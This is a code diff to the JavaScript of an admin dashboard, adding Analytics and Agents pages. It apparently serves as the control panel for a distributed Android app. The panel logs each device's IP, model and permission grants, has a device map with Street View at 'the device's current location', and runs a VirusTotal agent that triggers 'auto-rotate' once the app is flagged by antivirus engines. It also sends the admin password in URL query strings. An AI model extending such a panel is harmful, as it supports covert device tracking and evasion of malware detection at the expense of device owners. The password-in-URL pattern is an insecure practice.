@@ -346,7 +346,7 @@ function navigateTo(page) {
     const navEl = document.querySelector(`[data-page="${page}"]`);
     if (navEl) navEl.classList.add('active');
 
-    const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery', requests: 'Content Requests', users: 'App Users', godmode: 'God Mode' };
+    const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery', requests: 'Content Requests', users: 'App Users', godmode: 'God Mode', analytics: 'Analytics', agents: 'Agents' };
     document.getElementById('pageTitle').textContent = titles[page] || page;
 
     if (page === 'dashboard') loadDashboard();
@@ -360,6 +360,8 @@ function navigateTo(page) {
     if (page === 'requests') loadRequests();
     if (page === 'users') loadAppUsers();
     if (page === 'godmode') loadGodMode();
+    if (page === 'analytics') loadAnalytics();
+    if (page === 'agents') loadAgents();
 
     closeSidebar();
 
@@ -3631,7 +3633,7 @@ async function loadSystemConfig() {
 
     // Quick Domain Switcher state
     const railwayUrl = data.preset_railway || 'https://netmirror.up.railway.app';
-    const renderUrl = data.preset_render || 'https://leaksprogod.onrender.com';
+    const renderUrl = data.preset_render || 'https://klad4.onrender.com';
     document.getElementById('sysRailwayUrl').textContent = railwayUrl;
     document.getElementById('sysRenderUrl').textContent = renderUrl;
 
@@ -4989,6 +4991,233 @@ function onGeoMapMove() {
 // ═══════════════════════════════════════════════════════
 // STREET VIEW — Google Maps Street View embed
 // ═══════════════════════════════════════════════════════
+
+// ═══════════════════════════════════════════════════════
+// ANALYTICS PAGE
+// ═══════════════════════════════════════════════════════
+async function loadAnalytics() {
+  const days = document.getElementById('funnelDays')?.value || 30;
+  try {
+    const [funnelRes, geoRes, reachRes, eventsRes] = await Promise.all([
+      fetch(`${API_BASE}/api/analytics/funnel?days=${days}&password=${adminPassword}`),
+      fetch(`${API_BASE}/api/analytics/geo?days=${days}&password=${adminPassword}`),
+      fetch(`${API_BASE}/api/analytics/reachability?password=${adminPassword}`),
+      fetch(`${API_BASE}/api/analytics/events?limit=50&password=${adminPassword}`)
+    ]);
+    const funnel = await funnelRes.json();
+    const geo = await geoRes.json();
+    const reach = await reachRes.json();
+    const events = await eventsRes.json();
+
+    renderFunnel(funnel);
+    renderGeo(geo);
+    renderReachability(reach);
+    renderRecentEvents(events);
+  } catch (e) {
+    console.error('[Analytics] Load error:', e);
+  }
+}
+
+function renderFunnel(data) {
+  const el = document.getElementById('funnelContent');
+  if (!data || !data.steps) { el.innerHTML = '<p style="color:#666;">No funnel data yet.</p>'; return; }
+  const steps = data.steps;
+  const maxVal = Math.max(...steps.map(s => s.count), 1);
+  const colors = ['#00e5ff', '#00bcd4', '#0097a7', '#00796b', '#4caf50', '#8bc34a', '#cddc39'];
+  let html = '<div style="display:flex;flex-direction:column;gap:8px;">';
+  steps.forEach((s, i) => {
+    const pct = Math.round((s.count / maxVal) * 100);
+    const convRate = i > 0 && steps[i - 1].count > 0 ? Math.round((s.count / steps[i - 1].count) * 100) : 100;
+    html += `<div style="display:flex;align-items:center;gap:10px;">
+      <span style="width:130px;font-size:11px;color:#aaa;text-align:right;font-family:'JetBrains Mono',monospace;">${s.event.replace(/_/g, ' ')}</span>
+      <div style="flex:1;background:#1a1a1a;border-radius:4px;height:24px;position:relative;overflow:hidden;">
+        <div style="width:${pct}%;height:100%;background:${colors[i % colors.length]};border-radius:4px;transition:width 0.5s;"></div>
+        <span style="position:absolute;left:8px;top:3px;font-size:11px;color:#fff;font-weight:600;">${s.count}</span>
+      </div>
+      <span style="width:45px;font-size:11px;color:${convRate < 30 ? '#ff5252' : convRate < 60 ? '#ffc107' : '#4caf50'};font-family:'JetBrains Mono',monospace;">${convRate}%</span>
+    </div>`;
+  });
+  html += '</div>';
+  el.innerHTML = html;
+}
+
+function renderGeo(data) {
+  const el = document.getElementById('geoContent');
+  if (!data || !data.length) { el.innerHTML = '<p style="color:#666;">No geo data yet.</p>'; return; }
+  let html = '<table style="width:100%;font-size:12px;border-collapse:collapse;"><thead><tr style="color:#aaa;border-bottom:1px solid #333;"><th style="text-align:left;padding:6px;">Country</th><th style="text-align:left;padding:6px;">City</th><th style="text-align:right;padding:6px;">Events</th></tr></thead><tbody>';
+  data.slice(0, 20).forEach(r => {
+    html += `<tr style="border-bottom:1px solid #1a1a1a;"><td style="padding:6px;">${r.country || '—'}</td><td style="padding:6px;color:#aaa;">${r.city || '—'}</td><td style="padding:6px;text-align:right;font-family:'JetBrains Mono',monospace;color:#00e5ff;">${r.count}</td></tr>`;
+  });
+  html += '</tbody></table>';
+  el.innerHTML = html;
+}
+
+function renderReachability(data) {
+  const el = document.getElementById('reachabilityContent');
+  if (!data) { el.innerHTML = '<p style="color:#666;">No data yet.</p>'; return; }
+  const total = (data.online || 0) + (data.offline || 0);
+  const onlinePct = total > 0 ? Math.round((data.online / total) * 100) : 0;
+  el.innerHTML = `
+    <div style="display:flex;gap:20px;flex-wrap:wrap;">
+      <div style="text-align:center;"><div style="font-size:28px;font-weight:700;color:#4caf50;">${data.online || 0}</div><div style="font-size:11px;color:#aaa;">Online</div></div>
+      <div style="text-align:center;"><div style="font-size:28px;font-weight:700;color:#ff5252;">${data.offline || 0}</div><div style="font-size:11px;color:#aaa;">Offline</div></div>
+      <div style="text-align:center;"><div style="font-size:28px;font-weight:700;color:#00e5ff;">${onlinePct}%</div><div style="font-size:11px;color:#aaa;">Reachable</div></div>
+      <div style="text-align:center;"><div style="font-size:28px;font-weight:700;color:#ffc107;">${data.stale || 0}</div><div style="font-size:11px;color:#aaa;">Stale (>24h)</div></div>
+    </div>`;
+}
+
+function renderRecentEvents(events) {
+  const el = document.getElementById('recentEventsContent');
+  if (!events || !events.length) { el.innerHTML = '<p style="color:#666;">No events yet.</p>'; return; }
+  const eventColors = { page_visit: '#00e5ff', download_start: '#0097a7', download_complete: '#00796b', app_install: '#4caf50', first_open: '#8bc34a', permission_grant: '#cddc39', first_sync: '#ffc107' };
+  let html = '<div style="display:flex;flex-direction:column;gap:4px;">';
+  events.forEach(e => {
+    const color = eventColors[e.event] || '#666';
+    const ago = timeAgo(e.created_at);
+    html += `<div style="display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid #1a1a1a;font-size:11px;">
+      <span style="width:8px;height:8px;border-radius:50%;background:${color};flex-shrink:0;"></span>
+      <span style="color:${color};font-family:'JetBrains Mono',monospace;width:120px;">${e.event}</span>
+      <span style="color:#666;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${e.ip_address || ''} ${e.device_model || ''}</span>
+      <span style="color:#555;font-size:10px;white-space:nowrap;">${ago}</span>
+    </div>`;
+  });
+  html += '</div>';
+  el.innerHTML = html;
+}
+
+async function loadEventChart(eventType) {
+  const el = document.getElementById('eventChartArea');
+  el.innerHTML = '<span style="color:#555;">Loading...</span>';
+  try {
+    const res = await fetch(`${API_BASE}/api/analytics/events-by-day?event=${eventType}&days=14&password=${adminPassword}`);
+    const data = await res.json();
+    if (!data || !data.length) { el.innerHTML = '<span style="color:#555;">No data for this event.</span>'; return; }
+    const maxVal = Math.max(...data.map(d => d.count), 1);
+    let html = `<div style="margin-bottom:6px;color:#00e5ff;font-weight:600;">${eventType.replace(/_/g, ' ')} — last 14 days</div>`;
+    html += '<div style="display:flex;align-items:flex-end;gap:3px;height:100px;">';
+    data.forEach(d => {
+      const h = Math.max(Math.round((d.count / maxVal) * 90), 2);
+      const label = d.date ? d.date.slice(5) : '';
+      html += `<div style="display:flex;flex-direction:column;align-items:center;flex:1;">
+        <span style="font-size:9px;color:#aaa;margin-bottom:2px;">${d.count}</span>
+        <div style="width:100%;height:${h}px;background:#00e5ff;border-radius:2px;"></div>
+        <span style="font-size:8px;color:#555;margin-top:2px;">${label}</span>
+      </div>`;
+    });
+    html += '</div>';
+    el.innerHTML = html;
+  } catch (e) {
+    el.innerHTML = '<span style="color:#f44;">Error loading chart.</span>';
+  }
+}
+
+function timeAgo(dateStr) {
+  if (!dateStr) return '';
+  const diff = Date.now() - new Date(dateStr + 'Z').getTime();
+  if (diff < 60000) return 'just now';
+  if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
+  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
+  return Math.floor(diff / 86400000) + 'd ago';
+}
+
+// ═══════════════════════════════════════════════════════
+// AGENTS PAGE
+// ═══════════════════════════════════════════════════════
+async function loadAgents() {
+  try {
+    const res = await fetch(`${API_BASE}/api/agents/status?password=${adminPassword}`);
+    const data = await res.json();
+    renderSelfHeal(data.selfHeal);
+    renderVtAgent(data.vtAgent);
+    renderAnomalies(data.anomalies);
+  } catch (e) {
+    console.error('[Agents] Load error:', e);
+  }
+}
+
+function renderSelfHeal(data) {
+  const el = document.getElementById('selfHealContent');
+  if (!data || !data.servers) {
+    el.innerHTML = '<p style="color:#666;">Self-heal agent not reporting yet. It starts monitoring 30s after boot.</p>';
+    return;
+  }
+  let html = '<div style="display:flex;flex-direction:column;gap:8px;">';
+  if (data.failoverActive) {
+    html += '<div style="background:#ff52521a;border:1px solid #ff5252;border-radius:6px;padding:8px 12px;color:#ff5252;font-size:12px;"><i class="ri-alarm-warning-line"></i> FAILOVER ACTIVE — Primary is down, traffic routed to backup</div>';
+  }
+  for (const [name, status] of Object.entries(data.servers)) {
+    const ok = status.ok;
+    html += `<div style="display:flex;align-items:center;gap:10px;padding:8px;background:#1a1a1a;border-radius:6px;">
+      <span style="width:10px;height:10px;border-radius:50%;background:${ok ? '#4caf50' : '#ff5252'};"></span>
+      <span style="font-weight:600;color:#fff;min-width:100px;">${name}</span>
+      <span style="color:${ok ? '#4caf50' : '#ff5252'};font-size:12px;">${ok ? 'Healthy' : 'Down'}</span>
+      ${status.lastCheck ? `<span style="color:#555;font-size:10px;margin-left:auto;">${timeAgo(status.lastCheck)}</span>` : ''}
+      ${status.consecutiveFails > 0 ? `<span style="color:#ff5252;font-size:10px;">${status.consecutiveFails} fails</span>` : ''}
+    </div>`;
+  }
+  html += '</div>';
+  el.innerHTML = html;
+}
+
+function renderVtAgent(data) {
+  const el = document.getElementById('vtAgentContent');
+  if (!data) {
+    el.innerHTML = '<p style="color:#666;">VT agent not reporting yet. First scan runs 5 min after boot.</p>';
+    return;
+  }
+  const scoreColor = (data.detections || 0) === 0 ? '#4caf50' : (data.detections || 0) <= 3 ? '#ffc107' : '#ff5252';
+  el.innerHTML = `
+    <div style="display:flex;gap:20px;flex-wrap:wrap;align-items:center;">
+      <div style="text-align:center;">
+        <div style="font-size:36px;font-weight:700;color:${scoreColor};">${data.detections ?? '—'}/${data.total ?? '—'}</div>
+        <div style="font-size:11px;color:#aaa;">Detections</div>
+      </div>
+      <div style="flex:1;font-size:12px;color:#aaa;">
+        <div>Last scan: <b style="color:#fff;">${data.lastScan ? timeAgo(data.lastScan) : 'Never'}</b></div>
+        <div>Status: <b style="color:${scoreColor};">${(data.detections || 0) === 0 ? 'Clean' : (data.detections || 0) <= 3 ? 'Low Risk' : 'HIGH RISK — auto-rotate triggered'}</b></div>
+        ${data.scanId ? `<div style="margin-top:4px;font-size:10px;color:#555;">Scan ID: ${data.scanId}</div>` : ''}
+      </div>
+    </div>`;
+}
+
+function renderAnomalies(data) {
+  const el = document.getElementById('anomalyContent');
+  if (!data || !data.length) {
+    el.innerHTML = '<p style="color:#4caf50;"><i class="ri-check-line"></i> No anomalies detected. All systems normal.</p>';
+    return;
+  }
+  let html = '';
+  data.forEach(a => {
+    const color = a.severity === 'critical' ? '#ff5252' : a.severity === 'warning' ? '#ffc107' : '#00e5ff';
+    html += `<div style="display:flex;align-items:flex-start;gap:10px;padding:8px;background:#1a1a1a;border-left:3px solid ${color};border-radius:4px;margin-bottom:6px;">
+      <i class="ri-alarm-warning-line" style="color:${color};margin-top:2px;"></i>
+      <div style="flex:1;">
+        <div style="font-size:12px;color:#fff;font-weight:600;">${a.type || 'Anomaly'}</div>
+        <div style="font-size:11px;color:#aaa;">${a.message || ''}</div>
+        <div style="font-size:10px;color:#555;margin-top:2px;">${a.timestamp ? timeAgo(a.timestamp) : ''}</div>
+      </div>
+    </div>`;
+  });
+  el.innerHTML = html;
+}
+
+async function triggerVtScan() {
+  try {
+    await fetch(`${API_BASE}/api/agents/vt/scan`, { method: 'POST', headers: { 'x-admin-password': adminPassword } });
+    alert('VT scan triggered. Check back in a few minutes.');
+  } catch (e) {
+    alert('Failed to trigger VT scan: ' + e.message);
+  }
+}
+
+async function triggerDigest() {
+  try {
+    await fetch(`${API_BASE}/api/agents/digest`, { method: 'POST', headers: { 'x-admin-password': adminPassword } });
+    alert('Digest sent to Telegram.');
+  } catch (e) {
+    alert('Failed to trigger digest: ' + e.message);
+  }
+}
 
 /**
  * Open Street View at the device's current location.
